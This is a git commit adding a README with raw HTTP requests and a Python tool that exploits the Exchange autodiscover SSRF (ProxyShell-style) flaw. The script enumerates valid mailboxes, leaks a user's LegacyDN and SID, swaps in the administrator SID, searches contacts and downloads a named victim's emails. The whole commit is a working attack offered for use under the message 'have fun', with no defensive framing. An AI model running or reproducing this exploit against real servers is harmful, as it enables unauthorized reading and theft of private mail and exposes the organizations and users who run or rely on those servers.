e6eeddcb3d34b3a03d5d673fb25c9f8ff8494509
Jumbo <admin@chinabaiker.com>
2021-08-19 10:04:34 +0800

    have fun

--- README.md
+++ README.md
@@ -1,8 +1,137 @@
 # Some Attacks of Exchange SSRF
 
-## Brute Account
+# This project is heavily replicated in ProxyShell, NtlmRelayToEWS
+
+## Brute Account 爆破可能存在的用户
+
+file with emails 需要尝试的邮箱文件：
+
+/tmp/emails.txt：
+
+```
+admin@exchange.com
+test@exchange.com
+jumbo@exchange.com
+ceshi@exchange.com
+support@exchange.com
+```
+
+run 运行程序：
+```
+python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Brute --file /tmp/emails.txt
+```
+
+result 结果：
+
+```
+admin@exchange.com valid
+support@exchange.com valid
+```
 
 ![image-20210817172750895](README.assets/image-20210817172750895.png)
 
-## GET User inbox Count
 
+
+爆破用户的几个接口 一：
+
+```
+POST /autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx HTTP/1.1
+Host: mail.exchange.com
+User-Agent: Python PSRP Client
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: text/xml
+Cookie: Email=autodiscover/autodiscover.json?a=a@edu.edu
+Content-Length: 776
+
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
+xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
+xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+        <m:GetFolder>
+            <m:FolderShape>
+                <t:BaseShape>Default</t:BaseShape>
+            </m:FolderShape>
+            <m:FolderIds>
+                <t:DistinguishedFolderId Id="inbox">
+                    <t:Mailbox>
+                        <t:EmailAddress>admin@exchange.com</t:EmailAddress>
+                    </t:Mailbox>
+                </t:DistinguishedFolderId>
+            </m:FolderIds>
+        </m:GetFolder>
+    </soap:Body>
+</soap:Envelope>
+```
+
+用户存在会提示：
+
+```
+Access is denied. Check credentials and try again., 
+```
+
+
+
+爆破用户的几个接口 二：
+
+```
+POST /autodiscover/autodiscover.json?a=a@edu.edu/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json?a=a@edu.edu HTTP/1.1
+Host: mail.exchange.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36.
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: text/xml
+Content-Length: 369
+
+<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+        <Request>
+          <EMailAddress>admssin@exchange.com</EMailAddress>
+          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+        </Request>
+    </Autodiscover>
+    
+```
+
+用户不存在会提示：
+
+```
+The email address can't be found.
+```
+
+
+
+## Search Contacts
+
+run 运行程序：
+
+```
+python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Search --email validuser@exchange.com --keyword test
+```
+
+result 结果：
+
+```
+Board.Test@exchange.com
+LTSTest@exchange.com
+```
+
+## Download user's emails
+
+run 运行程序：
+```
+python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Download --email userwantdown@exchange.com
+```
+result 结果：
+
+```
+[+] Item [output/item-0.eml] saved successfully
+```
+
+
+
+![image-20210818142426337](README.assets/image-20210818142426337.png)
+
+![图片](README.assets/640.png)
---
+++ exchange_ssrf_attacks.py
@@ -0,0 +1,229 @@
+#coding:utf-8
+#author:Jumbo
+
+import requests
+from urllib3.exceptions import InsecureRequestWarning
+import logging
+import argparse
+from string import Template
+import xml.etree.cElementTree as ET
+from base64 import b64decode, b64encode
+import os
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+
+def GetLegacyDN(target,email):
+    logger.debug("[Stage 1] Performing SSRF attack against Autodiscover")
+    autoDiscoverBody = convertFromTemplate({'email':email},templatesFolder + "GetLegacyDN.xml")
+    stage1 = requests.post(f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json?a=a@edu.edu", headers={
+        "Content-Type": "text/xml",
+        "User-Agent": user_agent},
+                           data=autoDiscoverBody,
+                           verify=False
+                           )
+    # If status code 200 is NOT returned, the request failed
+    if stage1.status_code != 200:
+        logger.error("[Stage 1] Request failed - Autodiscover Error!")
+        exit()
+
+    # If the LegacyDN information is not in the response, the request failed as well
+    if "<LegacyDN>" not in stage1.content.decode('utf8').strip():
+        logger.error("[Stage 1] Cannot obtain required LegacyDN-information!")
+        exit()
+
+    # Define LegacyDN for further use in the script
+    legacyDn = stage1.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+
+    #print("[Stage 1] Successfully obtained DN: " + legacyDn)
+    return legacyDn
+
+
+def GetSID(target, legacyDn):
+    logger.debug("[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against " + target)
+
+    # Malformed MAPI body
+    mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
+
+    # Send the request
+    stage2 = requests.post(f"https://{target}/autodiscover/autodiscover.json?a=a@edu.edu/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json?a=a@edu.edu",
+        headers={
+        "Content-Type": "application/mapi-http",
+        "User-Agent": user_agent,
+        "X-RequestId": "1337",
+        "X-ClientApplication": "Outlook/15.00.0000.0000",
+        # The headers X-RequestId, X-ClientApplication and X-requesttype are required for the request to work
+        "x-requesttype": "connect"},
+                           data=mapi_body,
+                           verify=False
+                           )
+
+    if stage2.status_code != 200 or "act as owner of a UserMailbox" not in stage2.content.decode('cp1252').strip():
+        logger.error("[Stage 2] Mapi Error!")
+        exit()
+
+    sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]
+
+    if sid.split("-")[-1] != "500":
+        logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
+        base_sid = sid.split("-")[:-1]
+        base_sid.append("500")
+        sid = "-".join(base_sid)
+
+    logger.debug("[Stage 2] Successfully obtained SID: " + sid)
+    return sid
+
+def Brute_Account(target,email):
+    # logger.debug("[Stage 999] Brute Account With EWS ")
+    soap_body = convertFromTemplate({'email':email},templatesFolder + "Brute_Account.xml")
+    stage999 = requests.post(
+        "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
+            target), headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu"
+                            },
+        data=soap_body,
+        verify=False
+        )
+    # If status code 200 is NOT returned, the request failed
+    if stage999.status_code != 200:
+        logger.error("[Stage 999] Request failed - Brute Account Error!")
+        exit()
+    # print(stage999.content.decode())
+    if "Check credentials and try again" in stage999.content.decode():
+        print(f"{email} valid")
+
+
+
+def SearchContact(target,sid,keyword):
+    logger.debug("[Stage 888] Search Contact With ews/exchange.asmx ")
+    soap_body = convertFromTemplate({'sid':sid,'keyword':keyword},templatesFolder + "SearchContact.xml")
+    stage888 = requests.post(
+        "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
+            target), headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                            },
+        data=soap_body,
+        verify=False
+        )
+    # If status code 200 is NOT returned, the request failed
+    if stage888.status_code != 200:
+        logger.error("[Stage 999] Request failed - Brute Account Error!")
+        exit()
+    folderXML = ET.fromstring(stage888.content.decode())
+    for item in folderXML.findall(".//t:EmailAddress", exchangeNamespace):
+        print(item.text)
+
+
+def DownloadEmails(target, sid,folder):
+    logger.debug("[Stage 777] Get Mails Stage 1 Finditem ing... ")
+    FindItem_body = convertFromTemplate({'sid':sid,'folder':folder},templatesFolder + "FindItem.xml")
+    FindItem_request = requests.post(
+        "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
+            target), headers={
+            "Content-Type": "text/xml",
+            "User-Agent": user_agent,
+            "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                            },
+        data=FindItem_body,
+        verify=False
+        )
+    # If status code 200 is NOT returned, the request failed
+    if FindItem_request.status_code != 200:
+        logger.error("[Stage 777] Request failed - Get Mails Stage 1 Finditem Error!")
+        exit()
+    folderXML = ET.fromstring(FindItem_request.content.decode())
+    i = 0
+    for item in folderXML.findall(".//t:ItemId", exchangeNamespace):
+        params = {'sid':sid,'Id': item.get('Id'), 'ChangeKey': item.get('ChangeKey')}
+        logger.debug("[Stage 777] Get Mails Stage 2 GetItem ing... ")
+        GetItem_body = convertFromTemplate(params, templatesFolder + "GetItem.xml")
+        GetItem_request = requests.post(
+            "https://%s/autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx" % (
+                target), headers={
+                "Content-Type": "text/xml",
+                "User-Agent": user_agent,
+                "Cookie": "Email=autodiscover/autodiscover.json?a=a@edu.edu",
+                                },
+            data=GetItem_body,
+            verify=False
+            )   
+        itemXML = ET.fromstring(GetItem_request.content.decode())
+        mimeContent = itemXML.find(".//t:MimeContent", exchangeNamespace).text
+        logger.debug("[Stage 777] Get Mails Stage 3 Downloaditem ing... ")
+        try:
+            extension = "eml"
+            outputDir = "output"
+            if not os.path.exists(outputDir):
+                os.makedirs(outputDir)
+            fileName = outputDir + "/item-{}.".format(i) + extension
+            with open(fileName, 'wb+') as fileHandle:
+                fileHandle.write(b64decode(mimeContent))
+                fileHandle.close()
+                print("[+] Item [{}] saved successfully".format(fileName))
+        except IOError:
+            print("[!] Could not write file [{}]".format(fileName))
+        i = i + 1
+
+
+def convertFromTemplate(shellcode, templateFile):
+    try:
+        with open(templateFile) as f:
+            src = Template(f.read())
+            result = src.substitute(shellcode)
+            f.close()
+            return result
+    except IOError as e:
+        print("[!] Could not open or read template file [{}]".format(templateFile))
+        return e
+
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--target',required=True, help='the target Exchange Server ip')
+parser.add_argument('--email', help='victim email')
+parser.add_argument('--action',required=True,choices=['Brute','Search','Download'], help='The action you want to take')
+parser.add_argument("--file", help="email files with your want brute accounts")
+parser.add_argument("--keyword", help="keyword with you want search")
+parser.add_argument("--folder",default="inbox", help="folder name with you want download")
+args = parser.parse_args()
+
+
+#=========================================================================================
+# GLOBAL CONFIG
+#=========================================================================================
+templatesFolder = "ews_template/"
+# exchangeVersion = "Exchange2010_SP2"
+exchangeNamespace = {'m': 'http://schemas.microsoft.com/exchange/services/2006/messages', 't': 'http://schemas.microsoft.com/exchange/services/2006/types'}
+user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36."
+
+
+if __name__ == '__main__':
+    logger = logging.getLogger(__name__)
+    logger.setLevel(logging.DEBUG)
+    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
+    handler = logging.StreamHandler()
+    handler.setFormatter(formatter)
+    logger.addHandler(handler)
+
+
+    if args.target and args.action == "Brute" and args.file:
+        logger.debug("[Stage 999] Brute Account With EWS")
+        with open(args.file) as f:
+            for emails in f.readlines():
+                email = emails.strip()
+                Brute_Account(args.target, email)
+
+    elif args.target and args.email and args.action == "Search" and args.keyword:
+        legacyDn = GetLegacyDN(args.target, args.email)
+        sid = GetSID(args.target, legacyDn)
+        contactinfo = SearchContact(args.target, sid, args.keyword)
+
+
+    elif args.target and args.email and args.action == "Download" and args.folder:
+        legacyDn = GetLegacyDN(args.target, args.email)
+        sid = GetSID(args.target, legacyDn)
+        Items = DownloadEmails(args.target, sid, args.folder)
